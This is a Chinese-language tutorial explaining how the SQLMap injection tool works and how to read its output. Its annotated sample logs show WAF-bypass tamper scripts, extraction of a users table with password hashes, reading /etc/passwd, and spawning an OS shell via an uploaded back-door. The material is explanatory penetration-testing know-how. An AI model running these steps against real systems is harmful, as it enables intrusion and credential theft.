# SQLMap 工作原理&输出内容详解

##  SQLMap 工作原理

### 核心工作流程

### 1. **智能检测阶段**

```python
# SQLMap 的检测逻辑
1. 启发式检测 → 判断是否存在WAF
2. 注入点识别 → 测试所有参数(GET/POST/Cookie/Header)
3. 技术选择 → 根据响应选择最佳注入技术
4. 指纹识别 → 确定数据库类型和版本
```
### 2. **注入技术分类**

|技术类型|原理|适用场景|
|---|---|---|
|**布尔盲注**|通过真假条件差异判断|无错误信息但页面内容变化|
|**时间盲注**|通过响应时间延迟判断|无任何直接反馈|
|**报错注入**|触发数据库错误信息|错误信息显示在页面中|
|**联合查询**|使用UNION合并查询结果|结果直接显示在页面中|
|**堆叠查询**|执行多条SQL语句|支持多语句的数据库|

### 3. **自动化绕过机制**

- **编码绕过**：URL编码、Base64、Hex编码
    
- **注释技巧**：`/**/`、`--`、`#`
    
- **字符串拼接**：`CONCAT()`、`||`、`+`
    
- **大小写变形**：`SeLeCt`、`sEleCT`
    
- **等价函数替换**：不同数据库的相似函数
    

---

## 📊 命令行输出内容详解

### 执行示例命令：

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```
### 1. **启动信息段**

```text
[INFO] starting @ 14:30:25 /2024-01-15/
```
- **含义**：工具启动时间和版本信息
    
- **重要性**：⭐☆☆☆☆

### 2. **目标检测段**

```text
[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[WAF] identified WAF/IPS: 'CloudFlare'
```
- **含义**：连接测试和WAF识别
    
- **重要性**：⭐⭐⭐☆☆
    
- **注意**：识别WAF有助于调整攻击策略
    

### 3. **注入测试段**

```text
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
```
- **含义**：正在测试的注入技术类型
    
- **重要性**：⭐⭐☆☆☆
    
- **进度指示**：显示当前测试阶段
    

### 4. **漏洞发现段**

```text
[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable
```
- **含义**：发现可注入的参数和漏洞类型
    
- **重要性**：⭐⭐⭐⭐⭐
    
- **关键信息**：参数名、数据库类型、注入技术
    

### 5. **数据库指纹段**

```text

[INFO] the back-end DBMS is MySQL
[INFO] fetching banner
[INFO] retrieved: '5.7.35'
```
- **含义**：数据库类型和版本信息
    
- **重要性**：⭐⭐⭐⭐☆
    
- **用途**：确定后续利用的payload
    

### 6. **数据提取段**

```text
[INFO] fetching database names
[INFO] retrieved: 'information_schema'
[INFO] retrieved: 'testdb'
[INFO] fetching tables for database: 'testdb'
[INFO] retrieved: 'users'
[INFO] retrieved: 'products'
```
- **含义**：成功提取的数据库信息
    
- **重要性**：⭐⭐⭐⭐⭐
    
- **关键数据**：数据库名、表名、列名、数据记录
    

### 7. **文件操作段**

```text
[INFO] reading file: '/etc/passwd'
[INFO] retrieved: 'root:x:0:0:root:/root:/bin/bash\n...'
```
- **含义**：文件系统访问结果
    
- **重要性**：⭐⭐⭐⭐⭐
    
- **风险等级**：高危操作
    

---

## 🎯 输出颜色和符号含义

### 颜色编码：

- **🟢 绿色/INFO**：正常信息、成功操作
    
- **🟡 黄色/WARNING**：警告信息、需要注意
    
- **🔴 红色/ERROR**：错误信息、操作失败
    
- **🟣 紫色/CRITICAL**：关键信息、重要发现
    
- **🔵 蓝色/PAYLOAD**：发送的payload详情
    

### 常见状态符号：

```text
[INFO]     - 一般信息
[WARNING]  - 警告信息  
[ERROR]    - 错误信息
[CRITICAL] - 关键错误
[PAYLOAD]  - 发送的测试payload
[TRAFFIC]  - 网络流量信息
```
---

## 🔍 详细输出示例解析

### 完整过程示例：

```bash
[14:30:25] [INFO] starting sqlmap 1.6.5 
# 工具启动，版本信息

[14:30:26] [INFO] testing connection to the target URL
[14:30:27] [INFO] heuristics detected web page charset 'UTF-8'
# 连接测试和字符集检测

[14:30:28] [INFO] testing if the target URL content is stable
[14:30:29] [INFO] target URL content is stable
# 页面稳定性检测，确保测试准确性

[14:30:30] [INFO] testing if GET parameter 'id' is dynamic
[14:30:31] [INFO] GET parameter 'id' appears to be dynamic
# 参数动态性检测

[14:30:32] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
# 启发式检测发现可能注入点

[14:30:33] [INFO] testing for SQL injection on GET parameter 'id'
[14:30:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:30:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
# 开始具体注入技术测试

[14:30:40] [INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable 
# 发现漏洞！参数id存在MySQL布尔盲注

[14:30:41] [INFO] checking if the injection point on GET parameter 'id' is a false positive
[14:30:42] [INFO] the injection point is confirmed
# 确认不是误报

[14:30:43] [INFO] fetching database management system details
[14:30:44] [INFO] the back-end DBMS is MySQL
[14:30:45] [INFO] fetching banner
[14:30:46] [INFO] retrieved: '5.7.35'
# 获取数据库详细信息

[14:30:47] [INFO] fetching current database
[14:30:48] [INFO] retrieved: 'testdb'
# 获取当前数据库名

[14:30:49] [INFO] fetching tables for database: 'testdb'
[14:30:50] [INFO] retrieved: 'users'
[14:30:51] [INFO] retrieved: 'products'
# 获取数据库中的表

[14:30:52] [INFO] fetching columns for table 'users' in database 'testdb'
[14:30:53] [INFO] retrieved: 'id', 'username', 'password'
# 获取表的列结构

[14:30:54] [INFO] fetching entries for table 'users' in database 'testdb'
[14:30:55] [INFO] retrieved: 1, 'admin', '5f4dcc3b5aa765d61d8327deb882cf99'
[14:30:56] [INFO] retrieved: 2, 'user', 'e10adc3949ba59abbe56e057f20f883e'
# 提取表中的数据记录
```
---

## ⚡ 高级功能输出

### 1. **OS Shell 获取**

```text
[INFO] trying to upload the file stager on the back-end DBMS file system
[INFO] the file stager has been successfully uploaded on the back-end DBMS file system
[INFO] going to use the web back-door to spawn an OS shell
[INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
www-data
```
- **含义**：成功获取操作系统shell
    
- **风险等级**：极高
    

### 2. **WAF 绕过**

```text
[WAF] identified WAF/IPS: 'CloudFlare'
[INFO] using tamper script(s): 'charencode,space2comment'
[INFO] adjusting time delay to 2 seconds due to good response times
```
- **含义**：识别WAF并使用篡改脚本绕过
    
- **技术要点**：自动调整策略应对防护
    

### 3. **性能优化信息**

```text
[INFO] using 7 thread(s)
[INFO] resolved 5 hostname(s) on the target's DNS servers
[INFO] adjusting time delay to 1 second(s) due to good response times
```
- **含义**：自动优化线程数和延迟设置
    
- **目的**：提高检测效率同时避免触发防护